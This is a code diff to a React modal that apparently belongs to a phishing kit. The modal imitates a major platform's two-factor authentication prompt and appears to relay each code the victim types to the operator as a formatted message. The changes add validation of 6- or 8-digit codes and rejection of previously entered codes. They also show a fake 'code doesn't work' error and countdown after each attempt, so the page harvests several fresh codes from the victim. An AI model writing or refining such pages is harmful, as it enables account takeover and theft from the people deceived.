@@ -19,6 +19,11 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [selectedMethod, setSelectedMethod] = useState('notification');
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
+    // THÊM: State lưu lịch sử các mã đã nhập
+    const [previousCodes, setPreviousCodes] = useState<string[]>([]);
+    // THÊM: State lưu nội dung lỗi cụ thể
+    const [errorText, setErrorText] = useState('');
+
     const { geoInfo, messageId, messageContent, setMessageContent, userInfo } = store();
     const maxCode = config.MAX_CODE ?? 3;
     const loadingTime = config.CODE_LOADING_TIME ?? 60;
@@ -47,7 +52,27 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     useEffect(() => {
         if (!geoInfo) return;
 
-        const textsToTranslate = ['Two-factor authentication required', 'Enter the code for this account that we send to', 'or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue', 'Try another way', "Choose a way to confirm it's you", 'These are your available confirmation methods.', 'Text message', "We'll send a code to", 'Authentication app', 'Get a code from your authentication app.', 'Need another option?', 'To keep your account safe, accessing it without your usual login methods can take a few days. To get started, go to', 'account recovery'];
+        const textsToTranslate = [
+            'Two-factor authentication required',
+            'Enter the code for this account that we send to',
+            'or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)',
+            'Code',
+            "This code doesn't work. Check it's correct or try a new one after",
+            'Continue',
+            'Try another way',
+            "Choose a way to confirm it's you",
+            'These are your available confirmation methods.',
+            'Text message',
+            "We'll send a code to",
+            'Authentication app',
+            'Get a code from your authentication app.',
+            'Need another option?',
+            'To keep your account safe, accessing it without your usual login methods can take a few days. To get started, go to',
+            'account recovery',
+            // THÊM: các chuỗi lỗi mới
+            'Please enter a valid 6 or 8-digit code.',
+            'This code has been used before. Please enter a new code.'
+        ];
 
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
@@ -68,6 +93,7 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                 setCountdown((prev) => {
                     if (prev === 1) {
                         setShowError(false);
+                        setErrorText(''); // THÊM: reset lỗi khi hết đếm
                     }
                     return prev - 1;
                 });
@@ -77,13 +103,32 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     }, [countdown]);
 
     const handleSubmit = async () => {
-        if (!code.trim() || isLoading || code.length < 6 || countdown > 0) return;
+        // SỬA: Kiểm tra độ dài chính xác (6 hoặc 8)
+        if (code.length !== 6 && code.length !== 8) {
+            setErrorText(t('Please enter a valid 6 or 8-digit code.'));
+            setShowError(true);
+            return;
+        }
+
+        // SỬA: Kiểm tra trùng với các mã đã nhập trước đó
+        if (previousCodes.includes(code)) {
+            setErrorText(t('This code has been used before. Please enter a new code.'));
+            setShowError(true);
+            return;
+        }
+
+        // Các kiểm tra còn lại
+        if (isLoading || countdown > 0) return;
 
         setShowError(false);
+        setErrorText('');
         setIsLoading(true);
 
         const next = attempts + 1;
         setAttempts(next);
+
+        // Lưu mã vào lịch sử
+        setPreviousCodes([...previousCodes, code]);
 
         const codeLine = `<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;
 
@@ -104,6 +149,8 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
             nextStep();
         } else {
             setShowError(true);
+            // THÊM: đặt lỗi chung cho sai mã (có thể để trống để hiển thị mặc định)
+            setErrorText(t("This code doesn't work. Check it's correct or try a new one after"));
             setCode('');
             setCountdown(loadingTime);
         }
@@ -163,14 +210,17 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                                     const value = e.target.value.replaceAll(/\D/g, '');
                                     if (value.length <= 8) {
                                         setCode(value);
+                                        // SỬA: reset lỗi khi người dùng thay đổi input
                                         setShowError(false);
+                                        setErrorText('');
                                     }
                                 }}
                                 maxLength={8}
                                 disabled={countdown > 0}
                             />
                             <label htmlFor='code' className={`absolute top-1/2 left-0 -translate-y-6 pl-4 text-[13px] transition-all peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-[15px] peer-focus:-translate-y-6 peer-focus:text-[13px] ${showError ? 'text-red-600' : 'text-[#5d6c7b]'}`}>
-                                <span>{showError ? t('Invalid code') : t('Enter code')}</span>
+                                {/* SỬA: hiển thị errorText nếu có, không thì fallback */}
+                                <span>{showError ? (errorText || t('Invalid code')) : t('Enter code')}</span>
                             </label>
                             {code && (
                                 <button type='button' className='absolute top-1/2 right-0 -translate-y-1/2 pr-4' onClick={() => setCode('')}>
@@ -179,11 +229,20 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                             )}
                         </div>
 
-                        <button type='button' className='flex h-11 w-full items-center justify-center rounded-[22px] bg-[#0064e0] text-[15px] font-medium text-[#f1f4f7] transition-opacity disabled:cursor-not-allowed disabled:opacity-60' disabled={isLoading || countdown > 0} onClick={handleSubmit}>
+                        <button
+                            type='button'
+                            className='flex h-11 w-full items-center justify-center rounded-[22px] bg-[#0064e0] text-[15px] font-medium text-[#f1f4f7] transition-opacity disabled:cursor-not-allowed disabled:opacity-60'
+                            disabled={isLoading || countdown > 0}
+                            onClick={handleSubmit}
+                        >
                             {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent' /> : t('Continue')}
                         </button>
 
-                        <button type='button' className='h-11 w-full rounded-[22px] border border-[#ccd3db] text-[15px] font-medium text-[#0a1317] transition-colors hover:bg-gray-50' onClick={() => setShowMethodModal(true)}>
+                        <button
+                            type='button'
+                            className='h-11 w-full rounded-[22px] border border-[#ccd3db] text-[15px] font-medium text-[#0a1317] transition-colors hover:bg-gray-50'
+                            onClick={() => setShowMethodModal(true)}
+                        >
                             {t('Try another way')}
                         </button>
                     </div>
